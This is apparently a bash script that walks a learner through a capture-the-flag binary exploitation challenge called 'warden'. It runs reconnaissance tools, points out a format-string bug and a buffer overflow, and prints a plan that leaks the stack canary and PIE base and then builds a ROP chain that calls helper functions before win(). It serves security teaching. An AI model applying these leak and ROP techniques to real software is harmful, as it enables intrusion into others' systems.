#!/bin/bash
# Hands-on walkthrough for solving the warden challenge

echo "=== PWN Challenge Walkthrough: warden ==="
echo ""

echo "Step 1: Reconnaissance"
echo "====================="
echo ""

echo "1.1 - Check file type:"
file warden
echo ""

echo "1.2 - Check security protections:"
checksec warden
echo ""

echo "1.3 - List functions:"
nm warden | grep " T "
echo ""

echo "1.4 - Find interesting strings:"
strings warden | grep -E "flag|Flag|win|admin"
echo ""

read -p "Press Enter to continue to Step 2..."

echo ""
echo "Step 2: Analyze the win() function"
echo "===================================="
echo ""

echo "Let's see what win() requires:"
objdump -d warden | sed -n '/^00001324 <win>/,/^00001423/p' | head -30
echo ""

echo "Notice the checks:"
echo "  - cmp $0x1337,%eax  (jinx must be 0x1337)"
echo "  - cmp $0x420,%eax   (mf must be 0x420)"
echo "  - cmp $0xdeadbeef,%eax (trex must be 0xdeadbeef)"
echo "  - cmpl $0x123,0x8(%ebp) (argument must be 0x123)"
echo ""

read -p "Press Enter to continue to Step 3..."

echo ""
echo "Step 3: Find helper functions"
echo "=============================="
echo ""

echo "Look at braum():"
objdump -d warden | grep -A 15 "<braum>:"
echo ""
echo "This sets the 'jinx' global variable!"
echo ""

echo "Look at ornn():"
objdump -d warden | grep -A 15 "<ornn>:"
echo ""
echo "This sets the 'mf' global variable!"
echo ""

read -p "Press Enter to continue to Step 4..."

echo ""
echo "Step 4: Analyze vulnerabilities in tft()"
echo "=========================================="
echo ""

objdump -d warden | sed -n '/^00001423 <tft>/,/^000014ac/p' | grep -E "gets|printf"
echo ""
echo "Found:"
echo "  - gets() at line 1: Format string vulnerability (input -> printf)"
echo "  - gets() at line 2: Buffer overflow"
echo ""

read -p "Press Enter to continue to Step 5..."

echo ""
echo "Step 5: Find ROP gadgets"
echo "========================"
echo ""

echo "We need a 'pop; ret' gadget to clean up function arguments:"
ROPgadget --binary warden 2>/dev/null | grep "pop.*ret" | head -5
echo ""

echo "Found 'pop ebx; ret' at 0x1022"
echo ""

read -p "Press Enter to see the complete exploit strategy..."

echo ""
echo "Step 6: Complete Exploit Strategy"
echo "=================================="
echo ""

cat << 'STRATEGY'
Attack Plan:
-----------

1. INFORMATION LEAK (Format String)
   Input 1: "%3$08x|%15$08x"
   -> Leaks code pointer at position 3
   -> Leaks stack canary at position 15
   -> Calculate PIE base address

2. SET GLOBALS (ROP Chain)  
   Input 2: Buffer overflow with ROP chain
   -> Call braum(0x1337)   # Sets jinx
   -> Call ornn(0x420)     # Sets mf
   -> Call thress(0xdeadbeef) # Sets trex
   -> Call win(0x123)      # Prints flag

3. ROP Chain Structure:
   [buffer padding - 32 bytes]
   [canary - 4 bytes]
   [saved ebx - 4 bytes]
   [saved ebp - 4 bytes]
   [braum address]
   [pop_ret gadget]
   [0x1337 argument]
   [ornn address]
   [pop_ret gadget]
   [0x420 argument]
   [thress address]
   [pop_ret gadget]
   [0xdeadbeef argument]
   [win address]
   [fake return]
   [0x123 argument]
STRATEGY

echo ""
echo "=== End of Walkthrough ==="
echo ""
echo "Next steps:"
echo "1. Study the exploit.py file"
echo "2. Try modifying values to see what breaks"
echo "3. Practice on similar challenges"
echo "4. Read TUTORIAL.md for deeper understanding"
